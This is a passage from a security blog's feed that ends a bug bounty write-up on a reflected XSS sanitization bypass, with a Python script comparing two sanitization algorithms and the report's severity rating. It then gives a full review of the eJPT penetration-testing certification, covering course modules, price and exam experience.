        &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Boolean variable based sanitization  -&amp;gt;  &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;boolean_variable_based_sanitization&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Stack based sanitization  -&amp;gt;  &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stack_based_sanitization&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;# Print the results
&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As you can see, the 2 algorithms are very similar because they only differ in the type of variable used to keep track of whether there is any &amp;lt; unclosed character or not. If you put the above code in a main.py and you execute it with Python3, you will see the following output&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2022-09-20-bug-bounty-1/script-output.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It is easy to see that the first three inputs yield the same sanitization but the fourth and fifth, which is precisely where the &amp;lt; and &amp;gt; characters are nested, the sanitizations are different.&lt;/p&gt;

&lt;p&gt;I don’t know if the backend was using the boolean variable based sanitization algorithm because I didn’t have access to the backend code, but the behavior of the website sanitizations and the output of the script fit perfectly.&lt;/p&gt;

&lt;div id=&quot;section-id-4&quot; /&gt;

&lt;h2 id=&quot;4-report-resolution&quot;&gt;4. Report resolution&lt;/h2&gt;

&lt;p&gt;The subdomain is an e-commerce asset so they considered it an important asset of the company. An XSS usually is considered a medium severity vulnerability and because I wasn’t able to sign up and log in the web, I couldn’t demonstrate a high impact such as session hijacking. Therefore, the report was classified as&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Asset criticity: High&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Vulnerability severity: Medium&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;</content><author><name>HackCommander</name></author><category term="Bug Bounty" /><category term="web pentesting" /><category term="OSINT" /><category term="amass" /><category term="httpx" /><category term="gau" /><category term="kxss" /><category term="XSS" /><category term="python" /><category term="bypass" /><category term="sanitization" /><summary type="html">Partial disclosure of a bug bounty report: reflected XSS bypassing HTML tag removal sanitization.</summary></entry><entry><title type="html">eJPT certification review</title><link href="https://hackcommander.io/ejpt-certification-review/" rel="alternate" type="text/html" title="eJPT certification review" /><published>2022-09-01T00:00:00+02:00</published><updated>2022-09-01T00:00:00+02:00</updated><id>https://hackcommander.io/ejpt-certification-review</id><content type="html" xml:base="https://hackcommander.io/ejpt-certification-review/">&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;#section-id-1&quot;&gt;1. What is eJPT?&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#section-id-2&quot;&gt;2. What will you learn and what previous knowledge do you need?&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#section-id-3&quot;&gt;3. Is it useful for the curriculum?&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#section-id-4&quot;&gt;4. Is it affordable?&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#section-id-5&quot;&gt;5. How is the content?&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#section-id-5-1&quot;&gt;5.1. Penetration Testing Prerequisites&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#section-id-5-2&quot;&gt;5.2. Penetration Testing: Preliminary Skills &amp;amp; Programming&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#section-id-5-3&quot;&gt;5.3. Penetration Testing Basics&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#section-id-5-4&quot;&gt;5.4. eJPT Exam Preparation&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#section-id-6&quot;&gt;6. How is the exam?&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#section-id-7&quot;&gt;7. Conclusions&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p style=&quot;text-align:center;&quot;&gt;&lt;img src=&quot;/assets/images/2022-09-01-ejpt-certification-review/ejpt-logo.png&quot; alt=&quot;Logo&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In this post I am going to review the eLearnSecurity Junior Penetration Tester certification, better known as eJPT.&lt;/p&gt;

&lt;div id=&quot;section-id-1&quot; /&gt;

&lt;h2 id=&quot;1-what-is-ejpt&quot;&gt;1. What is eJPT?&lt;/h2&gt;

&lt;p&gt;We can consider eLearnSecurity Junior Penetration Tester (eJPT) certification as the first of multiples certs that the company eLearnSecurity offers to the IT professionals to begin their career in cybersecurity. The course covers the fundamentals about networking devices and protocols, web applications, programming and operative systems, all this from the point of view of offensive security, i.e., studying the most common types of attacks that you can perform. You can see the details in the following link&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://elearnsecurity.com/product/ejpt-certification/&quot;&gt;eJPT index&lt;/a&gt;&lt;/p&gt;

&lt;div id=&quot;section-id-2&quot; /&gt;

&lt;h2 id=&quot;2-what-will-you-learn-and-what-previous-knowledge-do-you-need&quot;&gt;2. What will you learn and what previous knowledge do you need?&lt;/h2&gt;

&lt;p&gt;If you click on the above link, you will see that the topics you will learn are&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;TCP/IP.&lt;br /&gt;&lt;/li&gt;
  &lt;li&gt;IP routing.&lt;br /&gt;&lt;/li&gt;
  &lt;li&gt;LAN protocols and devices.&lt;br /&gt;&lt;/li&gt;
  &lt;li&gt;HTTP and web technologies.&lt;br /&gt;&lt;/li&gt;
  &lt;li&gt;Essential penetration testing processes and methodologies.&lt;br /&gt;&lt;/li&gt;
  &lt;li&gt;Basic vulnerability assessment of networks.&lt;br /&gt;&lt;/li&gt;
  &lt;li&gt;Basic vulnerability assessment of web applications.&lt;br /&gt;&lt;/li&gt;
  &lt;li&gt;Exploitation with Metasploit.&lt;br /&gt;&lt;/li&gt;
  &lt;li&gt;Simple web application manual exploitation.&lt;br /&gt;&lt;/li&gt;
  &lt;li&gt;Basic information gathering and reconnaissance.&lt;br /&gt;&lt;/li&gt;
  &lt;li&gt;Simple scanning and profiling the target.&lt;br /&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;and I can assure you that it is absolutely correct. As you can see the words &lt;strong&gt;“basic”&lt;/strong&gt; and &lt;strong&gt;“simple”&lt;/strong&gt; appears a lot and that is important, eJPT is not an advanced certification, it is a beginner certification but you will learn a lot of useful recon and hacking techniques.&lt;/p&gt;

&lt;p&gt;Also as you can see in the link above, you can see the following prerequisites&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Deep understanding of networking concepts.&lt;br /&gt;&lt;/li&gt;
  &lt;li&gt;Simple manual web application security assessment and exploitation.&lt;br /&gt;&lt;/li&gt;
  &lt;li&gt;Basic vulnerability assessment of networks.&lt;br /&gt;&lt;/li&gt;
  &lt;li&gt;Using Metasploit for performing simple attacks.&lt;br /&gt;&lt;/li&gt;
  &lt;li&gt;Web application manual exploitation through attack vectors.&lt;br /&gt;&lt;/li&gt;
  &lt;li&gt;Ability to perform protocol analysis of a traffic capture.&lt;br /&gt;&lt;/li&gt;
  &lt;li&gt;Understanding of information gathering techniques.&lt;br /&gt;&lt;/li&gt;
  &lt;li&gt;Understanding of the penetration testing process.&lt;br /&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;and I have to say that I don’t agree with it. The link says that the above prerequisites could help you to pass the exam, and that is true, but that long prerequisites list might scare you. If you don’t know what a PC is, probably you will have problems taking the course and passing the exam but if you have a basic knowledge about computers and you are determined and motivated to learn, you will not have any problem.&lt;/p&gt;

&lt;div id=&quot;section-id-3&quot; /&gt;

&lt;h2 id=&quot;3-is-it-useful-for-the-curriculum&quot;&gt;3. Is it useful for the curriculum?&lt;/h2&gt;

&lt;p&gt;First of all, I would like to say that I don’t recommend to anyone to get into a certification process only to get a nice small piece of paper to impress the RRHH team. However, I am not a hater of certifications, I think that certs (good certs) are a very good way to start studying cybersecurity in a solid and structured way.&lt;/p&gt;

&lt;p&gt;Taking into account the above statement, I think that eJPT could be a &lt;strong&gt;very good cover letter&lt;/strong&gt; for IT professionals who want to get his first job in cybersecurity and to aspire to obtain other more advanced certifications like OSCP. If you are a senior pentester or if you have more advanced certifications such as OSCP, eJPT is probably not the best option for you.&lt;/p&gt;

&lt;div id=&quot;section-id-4&quot; /&gt;

&lt;h2 id=&quot;4-is-it-affordable&quot;&gt;4. Is it affordable?&lt;/h2&gt;

&lt;p&gt;The course is free and is provided by INE in the following link&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://my.ine.com/CyberSecurity/learning-paths/a223968e-3a74-45ed-884d-2d16760b8bbd/penetration-testing-student&quot;&gt;eJPT course&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;but before you have to create a free account in the following link&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://checkout.ine.com/starter-pass&quot;&gt;Free INE subscription&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The price of the voucher is 200$ but I bought it for 100$ during a 50% off promotion on all certifications during July 2022. The voucher includes 1 free retake and a 6 months period time to begin the certification process. It is important to note that you don’t need to buy the voucher to have access to the course so you can take a look at the course and then decide if you want to buy the voucher and start the certification process.&lt;/p&gt;

&lt;p&gt;In my opinion, considering the free course, the price of the voucher and the possibility of taking the voucher with a discount, the free retake… I think that eJPT is a &lt;strong&gt;very affordable certification&lt;/strong&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;:warning: Be careful with the name you use during the registration process on the INE website because that is the name that it will appear on the certificate of completion and you will not be able to change it on your own. In my case, I used only my name and my first surname so I had to contact to INE support to add my second surname to the profile and to the certificate of completion. I had to open several tickets and it took more than a month to make the change so I recommend that when you create the account you do it with the name you want to appear on your certificate of completion.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div id=&quot;section-id-5&quot; /&gt;

&lt;h2 id=&quot;5-how-is-the-content&quot;&gt;5. How is the content?&lt;/h2&gt;

&lt;p&gt;The duration of the course is about 50 hours and it took me approximately three weeks to study all the content. I have to say that, although this is my first certification, it isn’t my first contact with cybersecurity. Before passing the eJPT, I already had some experience in offensive cybersecurity as I had already participated in platforms like HackTheBox and TryHackMe, and I had some experience as a Bug Bounty Hunter doing Web Pentesting, topic on which I am going to start publishing posts very soon. At this point, I would like to recommend the TryHackMe Jr Penetration Tester Learning Path&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/path/outline/jrpenetrationtester&quot;&gt;TryHackMe Jr Penetration Tester Learning Path&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;In this learning path you will learn and practice many of the topics that are present in the eJPT content, so it’s a good idea to take this learning path before taking the eJPT, but it isn’t neccesary. The goal of this section isn’t to explain all the details about the course but I think that is a good idea to divide the section in points, one point for each course module.&lt;/p&gt;

&lt;div id=&quot;section-id-5-1&quot; /&gt;

&lt;h3 id=&quot;51-penetration-testing-prerequisites&quot;&gt;5.1. Penetration Testing Prerequisites&lt;/h3&gt;

&lt;p&gt;In this module you will learn:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;The basics of networking devices, such as what a router is and the differences between a switch and a hub.&lt;/li&gt;
  &lt;li&gt;The basics of networking protocols such DNS, ARP, TCP and UDP…&lt;/li&gt;
  &lt;li&gt;The basics of web applications, cookies, sessions, SOP, differences between HTTP and HTTPS…&lt;/li&gt;
  &lt;li&gt;The basics of important tools such Wireshark and Burpsuite.&lt;/li&gt;
  &lt;li&gt;A non-technical introduction to what pentesting is.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Although this module may seem very naive, I recommend you to study it, even if you already have previous knowledge of the subject matter . For example, I had medium previous knowledge about web pentesting but it was very useful for me to refresh some concepts about cookies and to see in practice the differences between HTTP and HTTPS. I knew that the main difference is data sent through HTTP is sent in clear text and data sent through HTTP is sent encrypted with TLS but I had never seen the difference in practice capturing traffic with wireshark.&lt;/p&gt;

&lt;p&gt;At this point, I would like to comment that the labs of all the modules are very interesting but sometimes the statements are not very clear, so dont be afraid to take a look to the solution if you are stuck and you don’t know what you are being asked to do.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;:warning: Pay special attention to the lab &lt;strong&gt;Find the Secret Server&lt;/strong&gt;. Its seems very simple and naive, and it is, but I advise to you to understand very well all the concepts of this lab because it could be very useful for you in the exam.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div id=&quot;section-id-5-2&quot; /&gt;

&lt;h3 id=&quot;52-penetration-testing-preliminary-skills--programming&quot;&gt;5.2. Penetration Testing: Preliminary Skills &amp;amp; Programming&lt;/h3&gt;

&lt;p&gt;In this module you will learn:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;What programming is.&lt;/li&gt;
  &lt;li&gt;The basics of a low-level programming language, such as C++.&lt;/li&gt;
  &lt;li&gt;The basics of a high-level programming language, such as Python.&lt;/li&gt;
  &lt;li&gt;The basics of some command line scripting languages, such as Bash for Linux and CMD and Powershell for Windows.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Probably this is the least important of all the modules because you don’t need to learn to program in C++ or Python to pass the exam but I think that it is a very important module if you want to improve as a pentester. In my opinion, it is very important to have a solid knowledge about programming to understand the main types of vulnerabilities and so you don’t turn into a script kiddie who only knows how to exploit vulnerabilities with metasploit. Also knowing about programming will give you the possibility to develop your own pentesting tools that you can share with the community.&lt;/p&gt;

&lt;p&gt;However, the section about Bash, CMD and Powershell it is very important, you need those languages to communicate with the operating systems in a non-graphical way. In fact you will need Bash to use in an optimal way your Linux Distribution to do pentesting, in my case Kali Linux, and to be able to launch the pentesting tools that you will see in this course.&lt;/p&gt;

&lt;div id=&quot;section-id-5-3&quot; /&gt;

&lt;h3 id=&quot;53-penetration-testing-basics&quot;&gt;5.3. Penetration Testing Basics&lt;/h3&gt;

&lt;p&gt;In this module you will learn:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;A set of techniques to perform information gathering about the target.&lt;/li&gt;
  &lt;li&gt;A set of techniques to perform discovering, scanning, footprinting… using tools such as Nmap.&lt;/li&gt;
  &lt;li&gt;The basics of vulnerabilty assessment with Nessus.&lt;/li&gt;
  &lt;li&gt;Different techniques to perform different kind of attacks in web applications, systems and in a network enviroment.&lt;/li&gt;
  &lt;li&gt;The basics of pivoting and port forwarding.&lt;/li&gt;
  &lt;li&gt;The use of the most basic tools of exploitation such as Arpspoof, Metasploit, Msfvenom, Xsser, Sqlmap, Burpsuite, John the Ripper, Hashcat…&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Probably this is the core module of the course and, without a doubt, the one I enjoyed the most. Because of I made before the TryHackMe Jr Penetration Tester Learning Path and because of my experience as a Bug Bounty Hunter, there were a lot of topics and tools that I already knew but it was a good refresh. However, I learn new techniques such as how to perform a Man In The Middle Attack (MITM). Probably my weak point was network attacks, so I learned a lot in this sense.&lt;/p&gt;

&lt;p&gt;Also, at the end of the module you will be able to practice the techniques learned during the course with 3 black-boxes. I advise you to pay special attention to these boxes and learn how to exploit RCE vulnerabilities on services like V-CMS and Werkzeug and learn about famous exploits like EternalBlue.&lt;/p&gt;

&lt;p&gt;I only have 2 complaints about this module:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Buffer Overflow is in the module but it is not explained how can be exploited and there isn’t an associated lab. I would have loved to see some more info about this vulnerability.&lt;/li&gt;
  &lt;li&gt;Pivoting and port forwarding techniques are not explained during the course. You will see directly these techniques in the blackboxes so if you don’t know anything about that, you will have to take a look to the solution to see how is done with Metasploit, Meterpreter, Proxychains…&lt;/li&gt;
&lt;/ul&gt;

&lt;div id=&quot;section-id-5-4&quot; /&gt;

&lt;h3 id=&quot;54-ejpt-exam-preparation&quot;&gt;5.4. eJPT Exam Preparation&lt;/h3&gt;

&lt;p&gt;In this module you will learn:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Nothing new :laughing:&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Essentially in this module you will see how to begin the certification process, i.e, how to connect to your exam enviroment. There are two labs but I don’t understand the reason for its existence, you will not learn anything new with that labs.&lt;/p&gt;

&lt;div id=&quot;section-id-6&quot; /&gt;

&lt;h2 id=&quot;6-how-is-the-exam&quot;&gt;6. How is the exam?&lt;/h2&gt;

&lt;p&gt;To begin the exam you have to log in Caendra and click on &lt;strong&gt;“Begin certification process”&lt;/strong&gt;. After that you will receive a pcap file, a list of user names, a list of passwords and a ovpn file to connect to the exam enviroment. If the name of the ovpn file is ovpn_file.ovpn, I advise to you to use the following command to connect to the enviroment&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo openvpn --config ovpn_file.ovpn --daemon
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;to run the ovpn file a as daemon, in the background.&lt;/p&gt;

&lt;p&gt;Then you should read all 20 questions before answering any questions and after that… the fun begins! First of all you will have to analyze the pcap looking for credentials, routers, servers, clients… interesting traffic in general. If you have difficulties in analyzing the pcap, I recommend you use the following pcap file analyzer&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://apackets.com/&quot;&gt;Pcap file analyzer tool&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;but ideally you should be able to analyze it manually.&lt;/p&gt;

&lt;p&gt;To answer the question you will have to use discovery and scanning techniques with Nmap, web pentesting tools like Burpsuite, Dirb or Sqlmap, exploiting tools like Metasploit, John the Ripper…&lt;/p&gt;

&lt;p&gt;In my opinion the machines in the exam are much easier than the most difficult machines of the course so don’t be afraid of failing the exam: if you have made the labs and you have understood it, you will pass the exam.&lt;/p&gt;

&lt;p&gt;It took me approximately 10 hours to answer all the questions but since I had plenty of time (the duration of the exam is 72 hours), I took the rest of the day off and waited until the next day to check and submit the answers. I answered all 20 questions correctly, as you can see in the following capture&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2022-09-01-ejpt-certification-review/ejpt-results.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;although you only have to asnwer correctly 15 questions to pass the exam and failures don’t penalize.&lt;/p&gt;

&lt;p&gt;Finally, when you pass the exam you will get a nice certificate of completion as follows&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2022-09-01-ejpt-certification-review/ejpt-certificate.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;and a link to attach in your linkedin profile&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://verified.elearnsecurity.com/certificates/b38d8ae2-8290-4f92-af3b-2e99336f5f4e&quot;&gt;Link to my eJPT certificate&lt;/a&gt;&lt;/p&gt;

&lt;div id=&quot;section-id-7&quot; /&gt;

&lt;h2 id=&quot;7-conclusions&quot;&gt;7. Conclusions&lt;/h2&gt;

&lt;p&gt;From all that we have seen we can say that the eJPT is a certification with the pros and cons:&lt;/p&gt;

&lt;h3 id=&quot;pros&quot;&gt;&lt;u&gt;Pros&lt;/u&gt;:&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;Beginner friendly.&lt;/li&gt;
  &lt;li&gt;Very good content structure.&lt;/li&gt;
  &lt;li&gt;Affordable price.&lt;/li&gt;
  &lt;li&gt;Useful for the curriculum.&lt;/li&gt;
  &lt;li&gt;Funny and not difficult exam.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;cons&quot;&gt;&lt;u&gt;Cons&lt;/u&gt;:&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;You can’t download the videos and the slides in pdf.&lt;/li&gt;
  &lt;li&gt;Sometimes the statements of the labs are not clear, so don’t be afraid to take a look to the solution if you are stuck and you don’t know what you are being asked to do.&lt;/li&gt;
  &lt;li&gt;Part of the content is studied directly in the labs, such as pivoting and port forwarding. I think that is not good because you could waste a lot of time trying to solve the lab thinking that you have the necessary skills, but you don’t have them.&lt;/li&gt;
  &lt;li&gt;Not very good technical support from INE. As I mentioned in section 4, something as simple as changing the name of my INE profile was a very time consuming process.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Despite the cons, I think that the eJPT certification is a &lt;strong&gt;highly recommended&lt;/strong&gt; cert for anyone interested in starting a career in the world of offensive security.&lt;/p&gt;</content><author><name>HackCommander</name></author><category term="Certification" /><category term="eLearnSecurity" /><category term="eJPT" /><category term="pentesting" /><summary type="html">Review of the eJPT (eLearnSecurity Junior Penetration Tester), certification of eLearnSecurity intended for students interested in obtaining the necessary training that a junior pentester should have.</summary></entry></feed>